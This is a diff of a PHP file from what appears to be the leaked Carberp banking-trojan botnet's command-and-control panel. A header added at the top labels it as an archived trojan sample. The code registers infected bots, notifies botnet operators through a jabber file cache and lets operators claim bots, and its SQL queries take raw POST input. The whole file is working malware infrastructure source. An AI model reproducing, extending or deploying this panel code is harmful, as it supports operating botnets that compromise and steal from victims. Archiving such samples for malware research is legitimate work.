@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $debag = false;
@@ -36,39 +47,53 @@ if(!empty($_POST['id']) && empty($_GET['id'])){
 
 	$bot = $mysqli->query('SELECT id,prefix,uid FROM bf_bots WHERE (prefix = \''.$_POST['prefix'].'\') AND (uid = \''.$_POST['uid'].'\') LIMIT 1');
 
-	if($bot->prefix == $_POST['prefix'] && $bot->uid == $_POST['uid']){
+	if($bot->prefix == $_POST['prefix'] && $bot->uid == $_POST['uid']){
+
 	   	$c = $mysqli->query('SELECT comment FROM bf_comments WHERE (prefix = \''.$_POST['prefix'].'\') AND (uid = \''.$_POST['uid'].'\') AND (type = \'10\') LIMIT 1');
 
-        $send = true;		if(!empty($config['hnocomment']) && $config['hnocomment'] != $c->comment){			$send = false;
+        $send = true;
+		if(!empty($config['hnocomment']) && $config['hnocomment'] != $c->comment){
+			$send = false;
 		}
 
-		if($send == true){			$uh = json_decode(file_get_contents($dir . 'cache/users_hunters.json'));
+		if($send == true){
+			$uh = json_decode(file_get_contents($dir . 'cache/users_hunters.json'));
 
-			foreach($uh as $user){				$text = 'http://' . $_SERVER['HTTP_HOST'] . '/set/hunter.html?id=' . $user->id . '&bid=' . $bot->id . "\r\n";
+			foreach($uh as $user){
+				$text = 'http://' . $_SERVER['HTTP_HOST'] . '/set/hunter.html?id=' . $user->id . '&bid=' . $bot->id . "\r\n";
 				if(!empty($c->comment)) $text .= 'Comment: ' . $c->comment;
 				@file_put_contents($dir . 'cache/jabber/to_' . $user->config->jabber . '_' . mt_rand(5, 15) . time(), $text);
 			}
 		}
 
 		print($config['hunter']);
-	}else{		print_data('BOT_NOT_FOUND!', true);
+	}else{
+		print_data('BOT_NOT_FOUND!', true);
 	}
-}elseif(!empty($_GET['id'])){    $_GET['id'] = (int) $_GET['id'];
+}elseif(!empty($_GET['id'])){
+    $_GET['id'] = (int) $_GET['id'];
     $_GET['bid'] = (int) $_GET['bid'];
 
 	$bot = $mysqli->query('SELECT id,post_id FROM bf_bots WHERE (id = \''.$_GET['bid'].'\') LIMIT 1');
     ;
-	if($bot->id == $_GET['bid']){		$user = $mysqli->query('SELECT id,config FROM bf_users WHERE (id = \''.$_GET['id'].'\') LIMIT 1');
+	if($bot->id == $_GET['bid']){
+		$user = $mysqli->query('SELECT id,config FROM bf_users WHERE (id = \''.$_GET['id'].'\') LIMIT 1');
 
-		if($user->id == $_GET['id']){			$user->config = json_decode($user->config, true);
-			if($user->config['sbbc'] == true){				if(empty($bot->post_id)){					$mysqli->query('update bf_bots set post_id = \''.$user->id.'\' WHERE (id = \''.$bot->id.'\')');
+		if($user->id == $_GET['id']){
+			$user->config = json_decode($user->config, true);
+			if($user->config['sbbc'] == true){
+				if(empty($bot->post_id)){
+					$mysqli->query('update bf_bots set post_id = \''.$user->id.'\' WHERE (id = \''.$bot->id.'\')');
 					$mysqli->query('update bf_bots_ip set post_id = \''.$user->id.'\' WHERE (prefix = \''.$bot->prefix.'\') AND  (uid = \''.$bot->uid.'\')');
 					print_data('YOU_HAVE_BOT!<br><a href="http://' . $_SERVER['HTTP_HOST'] . '/bots/bot-'.$bot->id.'.html" target="_blank">Посмотреть информацию о боте</a>', true);
-				}else{					print_data('BOT_ALREADY! :(', true);
+				}else{
+					print_data('BOT_ALREADY! :(', true);
 				}
-			}else{				print_data('USER_NOT_FOUND!', true);
+			}else{
+				print_data('USER_NOT_FOUND!', true);
 			}
-		}else{			print_data('USER_NOT_FOUND!', true);
+		}else{
+			print_data('USER_NOT_FOUND!', true);
 		}
 	}else{
 		print_data('BOT_NOT_FOUND!', true);
